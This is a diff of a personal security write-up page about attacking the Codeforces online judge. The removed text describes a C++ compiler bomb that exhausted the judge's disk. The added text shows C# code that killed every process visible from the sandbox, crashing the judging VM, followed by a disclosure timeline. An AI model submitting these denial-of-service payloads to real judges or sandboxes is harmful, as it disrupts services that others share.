@@ -5,9 +5,9 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="How it all started!">
-<meta name="keywords" content=" start">
-<title>The Start | Documentation for vulnerabilties found by Khaled Mohamed</title>
+<meta name="description" content="Seeing what code I can execute on the server!">
+<meta name="keywords" content=" dig">
+<title>The Dig | Documentation for vulnerabilties found by Khaled Mohamed</title>
 <link rel="stylesheet" href="css/syntax.css">
 
 
@@ -132,7 +132,7 @@
 
 
 
-  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the The Start page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
+  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the The Dig page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
 
 </li>
 
@@ -150,7 +150,7 @@
                                 searchInput: document.getElementById('search-input'),
                                 resultsContainer: document.getElementById('results-container'),
                                 dataSource: 'search.json',
-                                searchResultTemplate: '<li><a href="{url}" title="The Start">{title}</a></li>',
+                                searchResultTemplate: '<li><a href="{url}" title="The Dig">{title}</a></li>',
                     noResultsText: 'No results found.',
                             limit: 10,
                             fuzzy: true,
@@ -256,7 +256,7 @@
         <!-- Content Column -->
         <div class="col-md-9" id="tg-sb-content">
             <div class="post-header">
-   <h1 class="post-title-main">The Start</h1>
+   <h1 class="post-title-main">The Dig</h1>
 </div>
 
 
@@ -264,7 +264,7 @@
 <div class="post-content">
 
    
-    <div class="summary">How it all started!</div>
+    <div class="summary">Seeing what code I can execute on the server!</div>
    
 
     
@@ -295,55 +295,67 @@ $('#toc').on('click', 'a', function() {
 
     
 
-  <h2 id="prolouge">Prolouge:</h2>
+  <h2 id="episode-1">Episode 1:</h2>
+<p>So my previous playing with the server code-checker had helped me find one important thing. The checker ran on Windows.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\CONTES~1\AppData\Local\Temp
+</code></pre></div></div>
 
-<p>It was a quiet night and I had just woken up from a not very comfortable sleep. As always, I open up Codeforces.com and check what people are saying and look for a problem to solve. However, something was different. I was very irritated, I had failed to solve one dynamic programming challenge and I was pissed off. It was time for codeofrces to be put to rest. Or so I thought.</p>
-
-<h2 id="epilouge">Epilouge:</h2>
-
-<p>Codeforces is the biggest programming contests platform right now, but that didn’t matter. To me, codeforces was just software that ran untrusted code. I saw an opportunity. I write some code and they run it ON THEIR MACHINES! I thought to myself, how hard could it be to break this website when I hypothetically could feed the host with all the bad stuff you can think of? I was a naive but not far from the truth.</p>
-
-<p>For some context, codeforces has a field that let’s you send some code after specifying in which language/compiler your code wants to use and it’s compiled and then ran on some server and you’re passed the response to see. Basic stuff that online judges do.</p>
-
-<figure><a class="no_icon" target="_blank" href="https://codeforces.com/problemset/customtestm"><img class="docimage" src="images/cf_codearea.png" alt="codearea" /></a><figcaption>Codeforces' Code Area</figcaption></figure>
-
-<p>The first thing that came to my mind was trying to break the compiler. I remembered an article I had read about compiler bombs and decided to try that and see if they had correct compiler flags that could prevent such a trivial problem from occuring and to my surprise: they did not!</p>
-
-<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define Z struct X
-#define T template &lt;int N
-</span><span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">=</span> <span class="n">N</span> <span class="o">&gt;</span> <span class="n">Z</span><span class="p">;</span>
-
-<span class="k">struct</span> <span class="n">Y</span> <span class="p">{</span>
-	<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
-		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">};</span>
-
-<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span> <span class="mi">0</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
-<span class="n">T</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">N</span> <span class="o">&gt;:</span> <span class="n">Y</span> <span class="p">{};</span>
-<span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">M</span> <span class="o">&gt;</span> <span class="n">Z</span> <span class="p">{</span>
-<span class="k">static</span> <span class="kt">int</span> <span class="n">f</span><span class="p">()</span> <span class="p">{</span>
-	<span class="k">static</span> <span class="kt">int</span> <span class="n">x</span><span class="p">[</span><span class="mi">100000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
-			<span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span>
-			<span class="n">M</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span> <span class="o">+</span> <span class="n">X</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">,</span>
-			<span class="n">M</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">()</span>
-	<span class="p">};</span>
+<p>Now I opted for finding which version of Windows.</p>
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">OSVersion</span><span class="p">);</span>
 <span class="p">}</span>
-<span class="p">};</span>
-<span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&lt;</span><span class="mi">80</span><span class="o">&gt;</span> <span class="o">::</span><span class="n">f</span><span class="p">();</span>
+</code></pre></div></div>
+<p>And there we have it.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft Windows NT 6.1.7601 Service Pack 1
+</code></pre></div></div>
+<p>Knowing it’s windows offered something vital. I knew he had to nail the sandboxing otherwise the server is..well, we’ll see.</p>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
+<p>I thought about shutting down the server using normal methods:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>command line
+wmi
+</code></pre></div></div>
+<p>None of them worked as the process didn’t have enough permissions to access any system-level operations.</p>
+
+<p>So what else could cause windows to go crazy? Processes! 
+If you don’t control your access modifiers then we can pretty much do anything here. I tried a simple approach that I didn’t think would work.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">Codeforces</span>
+<span class="p">{</span>
+    <span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">processes</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="nf">GetProcesses</span><span class="p">();</span>
+
+            <span class="n">processes</span><span class="p">.</span><span class="nf">ToList</span><span class="p">().</span><span class="nf">ForEach</span><span class="p">(</span><span class="n">i</span> <span class="p">=&gt;</span> <span class="n">i</span><span class="p">.</span><span class="nf">Kill</span><span class="p">());</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>The idea behind this was that I knew the above code generated a huge object file by creating too many segments(more than 2^16 - 1) and that the server where this code was compiled had to have some sort of size limit. I was both right and wrong. After sending the code to the server I got a return that said:</p>
+<p>and to my surprise the invoker never returned! That VM went off causing the submissions queue to pile up until physically corrected.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Can't compile file:
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Assembler messages:
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: cannot fill 256 bytes in section .data$_ZZN1XILi76ELi76EE1fEvE1x of C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o because: 'No space left on device'
-C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: can't close C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o: No space left on device
-</code></pre></div></div>
+<p>This escalated to thinking why the sandbox was able to leak calls to other processes when it clearly shouldn’t. So I went to <a href="https://referencesource.microsoft.com">Microsoft Reference</a> and checked how GetProcesses worked and it turned out that the .NET Framework <a href="https://referencesource.microsoft.com/#System/compmod/microsoft/win32/NativeMethods.cs,ceeda2a57dec1eba">Wraps the Win32 API</a> and that’s why I was able to communicate with other processes outside of my sandbox.</p>
 
-<p>Which was good that I was able to hault the checker from cleaning the temp files and now I can just keep sending codes to somehow deplete the server’s storage. That was too lame and I had to dig deeper.</p>
+<h2 id="disclosure">Disclosure</h2>
+
+<p><strong>On March 13th:</strong> I wrote an email to <a href="#" data-toggle="tooltip" data-original-title="Founder and CEO of Codeforces.">Mike Mirzayanov</a> explaining that the way codes are being executed has a serious issue and gave him my suggestions on how to fix them.</p>
+
+<p><strong>On March 14th:</strong> MS C# was taken down from the website.</p>
+
+<p><strong>On March 15th:</strong> the issue could no longer be reproduced using MS C# and Mono C# took it’s place.</p>
+
+<p>One month after that I received something via mail..this cool T-shirt :)
+<img src="https://codeforces.com/predownloaded/b4/29/b4291d5468004fc95733b74af66b577b7587e544.png" /></p>
+
+<p><strong>But that wasn’t the end…</strong></p>
 
 
     <div class="tags">
